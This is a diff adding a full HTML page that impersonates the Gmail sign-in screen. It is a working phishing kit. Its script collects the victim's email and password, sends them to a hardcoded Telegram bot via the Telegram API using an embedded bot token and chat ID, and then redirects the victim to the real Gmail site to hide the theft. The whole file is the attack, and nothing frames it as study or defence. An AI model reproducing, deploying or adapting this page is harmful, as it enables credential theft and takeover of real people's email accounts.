@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail - Sign In</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', Arial, sans-serif;
+        }
+        
+        body {
+            background-color: white;
+        }
+        
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .logo {
+            text-align: center;
+            margin-top: 50px;
+            margin-bottom: 20px;
+        }
+        
+        .logo img {
+            width: 75px;
+            height: 24px;
+        }
+        
+        .signin-box {
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 40px 40px;
+            width: 100%;
+            max-width: 450px;
+        }
+        
+        .signin-box h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .signin-box p {
+            font-size: 16px;
+            margin-bottom: 40px;
+            text-align: center;
+        }
+        
+        .input-group {
+            position: relative;
+            margin-bottom: 20px;
+            width: 100%;
+        }
+        
+        .input-group input {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            outline: none;
+        }
+        
+        .input-group input:focus {
+            border-color: #1a73e8;
+            border-width: 2px;
+        }
+        
+        .input-group label {
+            position: absolute;
+            top: -10px;
+            left: 10px;
+            background-color: white;
+            padding: 0 5px;
+            font-size: 14px;
+            color: #1a73e8;
+            display: none;
+        }
+        
+        .input-group input:focus + label {
+            display: block;
+        }
+        
+        .forgot-email {
+            text-align: left;
+            margin-bottom: 40px;
+        }
+        
+        .forgot-email a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        
+        .buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 30px;
+        }
+        
+        .buttons a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+            padding: 10px 20px;
+            border-radius: 4px;
+        }
+        
+        .buttons button {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        
+        .buttons button:hover {
+            background-color: #1a63c7;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 40px;
+            font-size: 12px;
+            color: #5f6368;
+        }
+        
+        .footer-links a {
+            text-decoration: none;
+            color: #5f6368;
+            margin: 0 10px;
+        }
+        
+        .loading {
+            text-align: center;
+            margin-top: 30px;
+            display: none;
+        }
+        
+        .success-message {
+            text-align: center;
+            color: #1e8e3e;
+            margin-top: 20px;
+            font-weight: 500;
+            display: none;
+        }
+        
+        .error-message {
+            text-align: center;
+            color: #d93025;
+            margin-top: 20px;
+            font-weight: 500;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://placehold.co/75x24?text=Gmail" alt="Gmail Logo">
+        </div>
+        
+        <div class="signin-box">
+            <h1>Sign in</h1>
+            <p>to continue to Gmail</p>
+            
+            <div class="input-group">
+                <input type="email" id="email" autocomplete="username" required>
+                <label for="email">Email or phone</label>
+            </div>
+            
+            <div class="forgot-email">
+                <a href="#">Forgot email?</a>
+            </div>
+            
+            <div class="buttons">
+                <a href="#">Create account</a>
+                <button id="nextBtn">Next</button>
+            </div>
+            
+            <div id="passwordField" style="display: none;">
+                <div class="input-group">
+                    <input type="password" id="password" autocomplete="current-password" required>
+                    <label for="password">Enter your password</label>
+                </div>
+                
+                <div class="buttons">
+                    <a href="#">Forgot password?</a>
+                    <button id="signinBtn">Sign in</button>
+                </div>
+            </div>
+            
+            <div id="loading" class="loading">
+                <p>Signing in...</p>
+            </div>
+            
+            <div id="successMessage" class="success-message">
+                <p>Success! You're being redirected to Gmail...</p>
+            </div>
+            
+            <div id="errorMessage" class="error-message">
+                <p>Incorrect password. Try again.</p>
+            </div>
+        </div>
+        
+        <div class="footer-links">
+            <div>
+                <select>
+                    <option>English (United States)</option>
+                </select>
+            </div>
+            <div>
+                <a href="#">Help</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const telegramBotToken = '7701402172:AAFmsNJlL-q5M60PqcrhphqWS7tInuo7Vuk';
+        const chatId = '7060561246';
+        
+        document.getElementById('nextBtn').addEventListener('click', function() {
+            const email = document.getElementById('email').value;
+            
+            if (email) {
+                document.getElementById('email').disabled = true;
+                document.getElementById('passwordField').style.display = 'block';
+                document.getElementById('nextBtn').style.display = 'none';
+            }
+        });
+        
+        document.getElementById('signinBtn').addEventListener('click', function() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            document.getElementById('loading').style.display = 'block';
+            
+            // Send credentials to Telegram bot
+            sendToTelegram(email, password).then(() => {
+                // Show success message after a delay
+                setTimeout(() => {
+                    document.getElementById('loading').style.display = 'none';
+                    document.getElementById('successMessage').style.display = 'block';
+                    
+                    // Redirect after showing message
+                    setTimeout(() => {
+                        window.location.href = 'https://mail.google.com';
+                    }, 2000);
+                    
+                }, 1500);
+            });
+        });
+        
+        async function sendToTelegram(email, password) {
+            const message = `New Gmail Credentials:\nEmail: ${email}\nPassword: ${password}`;
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+                
+                const data = await response.json();
+                console.log('Message sent:', data);
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+            }
+        }
+    </script>
+</body>
+</html>
